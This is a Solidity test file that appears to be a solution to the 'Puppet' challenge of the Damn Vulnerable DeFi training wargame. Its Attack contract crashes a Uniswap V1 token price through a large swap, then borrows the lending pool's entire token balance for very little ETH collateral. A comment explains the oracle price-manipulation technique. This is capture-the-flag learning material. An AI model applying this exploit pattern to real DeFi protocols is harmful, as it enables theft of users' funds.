// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";
import {IUniswapV1Factory} from "../../src/puppet/IUniswapV1Factory.sol";


contract Attack {
    DamnValuableToken token;
    IUniswapV1Exchange uniswapV1Exchange;
    address player;
    address recovery;
    PuppetPool lendingPool;

    constructor(DamnValuableToken _token, IUniswapV1Exchange _uniswapV1Exchange, address _player, address _recovery, PuppetPool _lendingPool) {
        token = _token;
        uniswapV1Exchange = _uniswapV1Exchange;
        player = _player;
        recovery = _recovery;
        lendingPool = _lendingPool;
    }

    receive() external payable {}

    
    function startAttack() public payable {

        // Swap all tokens for ETH to manipulate the price
        token.approve(address(uniswapV1Exchange), type(uint256).max);
        uniswapV1Exchange.tokenToEthSwapInput(
            token.balanceOf(address(this)),
            1,
            block.timestamp + 1
        );

        // Calculate the amount of ETH needed to borrow all tokens from the lending pool
        uint256 amountToBorrow = token.balanceOf(address(lendingPool));

        // Borrow all tokens from the lending pool, depositing the required ETH collateral
        lendingPool.borrow{value: address(this).balance}(amountToBorrow, recovery);
    }
}


contract PuppetChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPrivateKey;

    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 10e18;
    uint256 constant UNISWAP_INITIAL_ETH_RESERVE = 10e18;
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 25e18;
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;

    DamnValuableToken token;
    PuppetPool lendingPool;
    IUniswapV1Exchange uniswapV1Exchange;
    IUniswapV1Factory uniswapV1Factory;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPrivateKey) = makeAddrAndKey("player");

        startHoax(deployer);

        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy a exchange that will be used as the factory template
        IUniswapV1Exchange uniswapV1ExchangeTemplate =
            IUniswapV1Exchange(deployCode(string.concat(vm.projectRoot(), "/builds/uniswap/UniswapV1Exchange.json")));

        // Deploy factory, initializing it with the address of the template exchange
        uniswapV1Factory = IUniswapV1Factory(deployCode("builds/uniswap/UniswapV1Factory.json"));
        uniswapV1Factory.initializeFactory(address(uniswapV1ExchangeTemplate));

        // Deploy token to be traded in Uniswap V1
        token = new DamnValuableToken();

        // Create a new exchange for the token
        uniswapV1Exchange = IUniswapV1Exchange(uniswapV1Factory.createExchange(address(token)));

        // Deploy the lending pool
        lendingPool = new PuppetPool(address(token), address(uniswapV1Exchange));

        // Add initial token and ETH liquidity to the pool
        token.approve(address(uniswapV1Exchange), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV1Exchange.addLiquidity{value: UNISWAP_INITIAL_ETH_RESERVE}(
            0, // min_liquidity
            UNISWAP_INITIAL_TOKEN_RESERVE,
            block.timestamp * 2 // deadline
        );

        token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
        token.transfer(address(lendingPool), POOL_INITIAL_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(uniswapV1Exchange.factoryAddress(), address(uniswapV1Factory));
        assertEq(uniswapV1Exchange.tokenAddress(), address(token));
        assertEq(
            uniswapV1Exchange.getTokenToEthInputPrice(1e18),
            _calculateTokenToEthInputPrice(1e18, UNISWAP_INITIAL_TOKEN_RESERVE, UNISWAP_INITIAL_ETH_RESERVE)
        );
        assertEq(lendingPool.calculateDepositRequired(1e18), 2e18);
        assertEq(lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE), POOL_INITIAL_TOKEN_BALANCE * 2);
    }

    /*
        The exploit takes advantage of the fact that the lending pool calculates the required deposit based on the
        current price of the token in the Uniswap exchange. By manipulating the price of the token
        in the Uniswap exchange through a large token swap, the attacker can significantly reduce
        the amount of ETH required to borrow all tokens from the lending pool. This is achieved by
        swapping a large amount of tokens for ETH, which increases the token reserve and decreases
        the ETH reserve in the Uniswap pool, thus lowering the token price. As a result, the attacker
        can borrow all tokens from the lending pool by depositing a much smaller amount of ETH than would
        normally be required, effectively draining the pool.
    */
    function test_puppet() public checkSolvedByPlayer {


        //New attack contract
        Attack attack = new Attack(token, uniswapV1Exchange, player, recovery, lendingPool);
        
        //Transfer all tokens to the attack contract
        token.transfer(address(attack), token.balanceOf(player));

        //Start the attack by swapping all tokens for ETH and borrowing all tokens from the pool
        attack.startAttack{value: player.balance}();
      
    }

    // Utility function to calculate Uniswap prices
    function _calculateTokenToEthInputPrice(uint256 tokensSold, uint256 tokensInReserve, uint256 etherInReserve)
        private
        pure
        returns (uint256)
    {
        return (tokensSold * 997 * etherInReserve) / (tokensInReserve * 1000 + tokensSold * 997);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
      

        // All tokens of the lending pool were deposited into the recovery account
        assertEq(token.balanceOf(address(lendingPool)), 0, "Pool still has tokens");
        assertGe(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
        // Player executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");
        
    }
}
